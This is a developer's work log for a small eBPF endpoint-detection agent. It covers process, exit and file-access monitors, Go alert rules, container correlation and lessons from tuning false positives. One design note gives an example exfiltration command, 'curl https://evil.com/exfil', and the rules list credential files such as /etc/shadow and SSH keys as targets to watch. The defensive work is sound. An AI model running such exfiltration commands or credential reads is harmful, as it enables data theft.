# Work Log / Notes

---

## Completed

- [x] `execsnoop.bpf.c` + `main.go` — process monitor capturing execve events
- [x] `exitsnoop.bpf.c` — exit monitor with ring buffer, both running concurrently
- [x] Integration tests pass while monitor runs — no false positives (snapshot: PrintProcess&Exit.png)
- [x] Fix `alert.go` format string bug — `comm=%!s(int32=...)` → correct output
- [x] `rules.go` — detection rules: shell spawn, network tools, short-lived exit
- [x] `alert.go` — Alert struct with Ppid, Uid, Container fields
- [x] `mnt_ns` container correlation — `execsnoop.bpf.c` reads `mnt_ns_id` via CO-RE, `container.go` resolves to container name
- [x] Fix `ExitEvent` struct alignment bug — Go struct field order did not match C struct
- [x] `opensnoop.bpf.c` — file access monitor with ring buffer, two-probe pattern (enter+exit)
- [x] File access detection rules — tiered severity: CRITICAL/HIGH/MEDIUM
- [x] Fix garbled comm/filename output — replaced `bytes.TrimRight` with `cstring()` (IndexByte)
- [x] Remove curl from process rules — decision: curl detection belongs in lsm-connect (destination-aware)
- [x] BPF fix: emit on EACCES/EPERM in addition to success — restores `cat /etc/shadow` detection
- [x] pid→container cache — fixes `container=unknown` and wrong ppid in exit events

---

## Key Technical Notes

### TASK_COMM_LEN: 16 → 128
Changed `#define TASK_COMM_LEN 16` to `128` in all `.h` files to capture full executable paths.
Must match Go struct field size exactly — `Comm [128]byte`.

---

### mnt_ns_id — use __u32 not __u64
Kernel's `ns.inum` is `unsigned int` (32-bit). Use `__u32 mnt_ns_id` in C struct and `uint32` in Go.
`BPF_CORE_READ(task, nsproxy, mnt_ns, ns.inum)` — requires kernel 5.8+ BTF (6.1 confirmed working).

---

### Container name resolution
Docker sets `HOSTNAME` env var to container ID (short hash), NOT container name.
Reliable approach: `docker ps --no-trunc` → build full container ID → name map.
Then `/proc/<pid>/cgroup` → extract container ID → look up name.

Debian 12 / kernel 6.1 uses **cgroupv2** — path format is:
`0::/system.slice/docker-<64char-id>.scope` (not `/docker/<id>`)
Fixed `containerIDFromCgroup` to handle both cgroupv1 and cgroupv2 formats.

**Validated** — alert shows `container=order-processor-auth_service`, host processes silently skipped.

---

### ExitEvent struct alignment bug (fixed)
Original C struct had implicit 4-byte padding before `duration_ns`:
```
int pid (4) + int ppid (4) + unsigned exit_code (4) + [4 implicit pad] + unsigned long long duration_ns (8) + comm (128) = 152 bytes
```
Go struct had wrong field order (DurationNs first) → all fields read as garbage.

Fix: reordered `exitsnoop.h` — `duration_ns` first, explicit `unsigned int pad`:
```
duration_ns (8) + pid (4) + ppid (4) + exit_code (4) + pad (4) + comm (128) = 152 bytes, no implicit padding
```
Go `ExitEvent` updated to match exactly.

**Rule**: always put the largest field first to avoid implicit padding. Explicit pad fields replace tail padding so C sizeof == Go binary.Size.

---

### Why `unsigned long long` for duration_ns
`bpf_ktime_get_ns()` returns u64 (nanoseconds). An `unsigned int` (u32) overflows at ~4.29 seconds.
We saw python3 at 12,595ms in real output — that is 3× over the u32 limit. Must stay u64.

---

### Perf Buffer vs Ring Buffer
`execsnoop.bpf.c` uses `BPF_MAP_TYPE_PERF_EVENT_ARRAY` (perf buffer, older pattern).
All new programs (`exitsnoop`, `opensnoop`, `lsm-connect`) use `BPF_MAP_TYPE_RINGBUF` (modern — lower overhead, no per-CPU waste).

---

### Garbled comm/filename — cstring() fix
**Problem**: `bytes.TrimRight(b, "\x00")` scans from the RIGHT and stops at the first non-null byte.
`bpf_ringbuf_reserve` does NOT zero-initialize memory. `bpf_probe_read_user_str` writes up to the null terminator but leaves the rest of the buffer as garbage from previous ring buffer usage.
Result: comm and filename printed with garbage after the real string.

**Fix**: `cstring(b []byte)` uses `bytes.IndexByte(b, 0)` — finds the FIRST null byte and slices there. This is correct C-string semantics.

`bpf_get_current_comm` uses `strncpy` which DOES zero-pad, so comm was technically safe with TrimRight. But `bpf_probe_read_user_str` does NOT zero-pad. Both now use `cstring` for consistency.

---

### opensnoop: two-probe pattern (sys_enter + sys_exit)

**Why two probes?**
A single `sys_enter_openat` hook fires on every attempt — including when curl probes `~/.curlrc` which does not exist. This fires HIGH alerts for harmless config-file probing.

**Pattern**:
1. `sys_enter_openat` — read filename + process context, store in `pending_opens` hash map keyed by tid
2. `sys_exit_openat` — check return value, emit to ring buffer only if file was actually accessed, delete from map

**Return code logic** (critical — easy to get wrong):
- `ret >= 0` — valid fd, file opened successfully → emit
- `ret == -EACCES` — file EXISTS, OS blocked access (uid mismatch) → **emit** (attack attempt)
- `ret == -EPERM` — operation not permitted on existing file → **emit**
- `ret == -ENOENT` — file does not exist, just probing → **drop**
- other negative — benign errors → drop

**Mistake we made**: initially dropped ALL negative returns (`if ret < 0 → drop`).
This broke `cat /etc/shadow` detection: uid=1000 gets `-EACCES`, which was silently dropped.
Fix: `if ret < 0 && ret != -EACCES && ret != -EPERM → drop`

**Rule**: the access ATTEMPT against an existing sensitive file is the signal, whether the OS allowed it or not.

---

### File rule design — tiered severity

Learned through real output: not all sensitive files carry the same risk.

| Tier | Files | Severity | Reason |
|---|---|---|---|
| CRITICAL | `/root/.ssh/`, `/home/.ssh/` | CRITICAL | SSH keys → direct access |
| HIGH | `/etc/shadow`, `/run/secrets/`, `/proc/1/`, `.key`, `id_rsa`, `id_ed25519`, `.env` | HIGH | Credential theft, container escape |
| MEDIUM | `/etc/passwd`, `/etc/group` | MEDIUM | World-readable, but unexpected from app code |

**`.pem` removed** — too broad. Python `certifi` library loads `cacert.pem` (CA bundle) on every HTTPS request. Keeping `.pem` fires HIGH on every API call. Private keys are caught by `.key` and `id_*` names.
**TODO**: restore `.pem` with a path exception for `/site-packages/` and `/certifi/` before shipping.

---

### curl detection — why removed from process rules

**Original rule**: `curl_from_container` — alert when curl runs inside any non-whitelisted container.

**Problem**: fires on every Docker `HEALTHCHECK` (every Dockerfile has `curl -f http://localhost:PORT/health`), every integration test smoke test, and documentation examples. Fires on ALL containers, every 10–30 seconds.

**Root cause**: execsnoop sees the binary name, not the destination. Cannot distinguish:
- `curl http://localhost:8080/health` — health check, expected
- `curl https://evil.com/exfil` — attack

**Decision**: remove from process rules entirely. The correct detection is in `lsm-connect`, which hooks the network connection and can check destination IP/domain. `allowedMarketAPI = "api.coingecko.com"` constant is reserved for that enforcement.

**Lesson**: a rule that fires on every health check is worse than no rule — it trains operators to ignore alerts. Better to have a gap and fill it at the right layer.

---

### pid→container cache — fixes exit event unknowns

**Problem 1 — container=unknown**: Go tries to read `/proc/<pid>/ns/mnt` when an exit event arrives, but the process is already gone from `/proc`. Returns `unknown`.

**Problem 2 — wrong ppid**: `real_parent` in the kernel at exit time may have changed to init (PID 1) due to Linux reparenting — when a parent dies before its child, the child is reparented to init. So ppid in exit events was sometimes 0 or 1.

**Fix**: cache `pid → PidInfo{Container, Ppid}` when execsnoop fires (process starts). When exitsnoop fires, look up and evict from cache. Use cached values instead of re-reading `/proc`.

**Implementation**: `sync.Map` in `container.go` — safe for concurrent goroutine access. `LoadAndDelete` atomically retrieves and removes the entry.

**Limitation**: processes that started before the EDR agent launched have no cache entry — these still show `unknown`. This is expected and acceptable.

---

## Rule Philosophy (learned from trial and error)

1. **Never remove a rule just to reduce noise** — that creates a blind spot. Tune it instead.
2. **BPF = wide net** — collect all relevant events with minimal kernel-side filtering.
3. **Go = smart rules** — all detection logic in userspace where context is available.
4. **False positives → make rules smarter, not smaller** — add comm/path context, not delete.
5. **Detection at the right layer** — process-level rules catch binary names; network-level (lsm-connect) catches destinations. Don't mix them.

---

## To Do

- [ ] Restore `.pem` with path exception for `/site-packages/` and `/certifi/`
- [ ] Rewrite `lsm-connect.bpf.c` with ring buffer + Go integration
- [ ] Wire lsm-connect into `main.go`
- [ ] Implement curl destination check in lsm-connect: only `inventory_service` → `api.coingecko.com`
- [ ] Go unit tests — `rules_test.go`, `container_test.go`
- [ ] Final validation — all rules trigger + integration tests pass simultaneously
